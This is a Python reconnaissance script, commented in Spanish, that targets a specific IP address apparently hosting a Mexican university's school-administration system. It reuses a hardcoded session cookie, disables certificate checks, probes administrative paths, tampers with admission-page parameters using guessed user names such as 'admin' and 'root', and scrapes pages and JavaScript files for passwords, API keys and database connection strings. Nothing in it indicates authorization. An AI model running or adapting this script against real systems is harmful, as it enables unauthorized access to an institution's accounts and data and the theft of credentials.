# sito_deep_analysis.py
import requests
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SITODeepAnalysis:
    def __init__(self):
        self.base_url = "https://189.254.143.102"
        self.session = requests.Session()
        self.session.verify = False
        self.session.cookies.set('JSESSIONID', '3B0DDD39CD0068BB30ED28B8C75B2A38')
        
    def analyze_application_structure(self):
        """Análisis profundo de la estructura de SITO"""
        print("=== ANÁLISIS PROFUNDO SITO ===")
        
        # Página principal autenticada
        main_url = f"{self.base_url}/jsp/index.jsp"
        response = self.session.get(main_url)
        
        print(f"[+] Página principal: {len(response.text)} bytes")
        
        # Buscar enlaces y funcionalidades
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Encontrar todos los enlaces
        links = soup.find_all('a', href=True)
        print(f"Enlaces encontrados: {len(links)}")
        
        for link in links[:10]:  # Mostrar primeros 10
            href = link['href']
            if href and not href.startswith('#'):
                print(f"  🔗 {href}")
        
        # Buscar formularios
        forms = soup.find_all('form')
        print(f"Formularios encontrados: {len(forms)}")
        
        # Buscar scripts JavaScript
        scripts = soup.find_all('script')
        print(f"Scripts encontrados: {len(scripts)}")
        
        # Buscar información sensible en el HTML
        self.search_sensitive_info(response.text)
    
    def search_sensitive_info(self, html_content):
        """Busca información sensible en el contenido HTML"""
        print("\n[+] Buscando información sensible...")
        
        patterns = {
            'emails': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
            'ip_addresses': r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b',
            'database_references': r'(jdbc|mysql|oracle|database|sql)',
            'api_endpoints': r'/(api|ajax|json|xml|ws)/[^\s"\'<>]+',
            'hidden_inputs': r'<input[^>]*type=["\']hidden["\'][^>]*>',
        }
        
        for pattern_name, pattern in patterns.items():
            matches = re.findall(pattern, html_content, re.IGNORECASE)
            if matches:
                print(f"  🔍 {pattern_name}: {len(matches)} encontrados")
                for match in list(set(matches))[:3]:  # Mostrar únicos
                    print(f"    • {match}")
    
    def explore_administrative_features(self):
        """Explora características administrativas"""
        print("\n[+] Explorando características administrativas...")
        
        admin_paths = [
            "/jsp/admin/", "/jsp/administracion/", "/jsp/config/",
            "/jsp/system/", "/jsp/settings/", "/jsp/usuarios/",
            "/jsp/reportes/", "/jsp/backup/", "/jsp/database/",
            "/jsp/escolar/admin/", "/jsp/escolar/config/"
        ]
        
        for path in admin_paths:
            url = f"{self.base_url}{path}"
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code == 200:
                    print(f"✅ Acceso a: {path}")
                    
                    # Buscar funcionalidades específicas
                    if any(keyword in response.text.lower() for keyword in 
                          ['password', 'usuario', 'config', 'database']):
                        print("   🔍 Características administrativas detectadas")
                        
            except:
                pass
    
    def test_functional_parameters(self):
        """Prueba parámetros funcionales en las URLs"""
        print("\n[+] Probando parámetros funcionales...")
        
        # URL base del proceso de admisión
        base_url = f"{self.base_url}/jsp/escolar/proceso_admision/proceso_interesado.jsp"
        
        # Parámetros basados en el análisis previo
        test_params = {
            "xModalidadP": ["N", "D", "Z", "X", "admin", "1"],
            "yAccion": ["debug", "test", "admin", "config"],
            "yUsuario": ["hnieto", "admin", "root"],
            "yIntentos": ["0", "999", "admin"]
        }
        
        for param, values in test_params.items():
            for value in values:
                url = f"{base_url}?{param}={value}"
                try:
                    response = self.session.get(url, timeout=5)
                    if response.status_code == 200:
                        # Buscar cambios en la respuesta
                        if "error" not in response.text.lower() and len(response.text) > 1000:
                            print(f"✅ Parámetro {param}={value} - Respuesta diferente")
                            
                except:
                    pass
    
    def analyze_javascript_files(self):
        """Analiza archivos JavaScript en busca de credenciales"""
        print("\n[+] Analizando archivos JavaScript...")
        
        js_files = [
            "/javascript/utilities.js",
            "/javascript/scriptAnimaciones.js",
            "/styles2/script.js",
            "/js/app.js",
            "/jsp/javascript/common.js"
        ]
        
        for js_file in js_files:
            url = f"{self.base_url}{js_file}"
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code == 200:
                    print(f"✅ Archivo JS: {js_file}")
                    
                    # Buscar credenciales hardcodeadas
                    content = response.text
                    sensitive_patterns = [
                        r'password\s*[:=]\s*[\'"]([^\'"]+)[\'"]',
                        r'user\s*[:=]\s*[\'"]([^\'"]+)[\'"]',
                        r'apiKey\s*[:=]\s*[\'"]([^\'"]+)[\'"]',
                        r'jdbc:mysql://([^"\']+)',
                        r'utslp\.edu\.mx'
                    ]
                    
                    for pattern in sensitive_patterns:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        if matches:
                            print(f"   🔍 Encontrado: {pattern} -> {matches}")
                            
            except:
                pass

# Ejecutar
if __name__ == "__main__":
    analysis = SITODeepAnalysis()
    analysis.analyze_application_structure()
    analysis.explore_administrative_features()
    analysis.test_functional_parameters()
    analysis.analyze_javascript_files()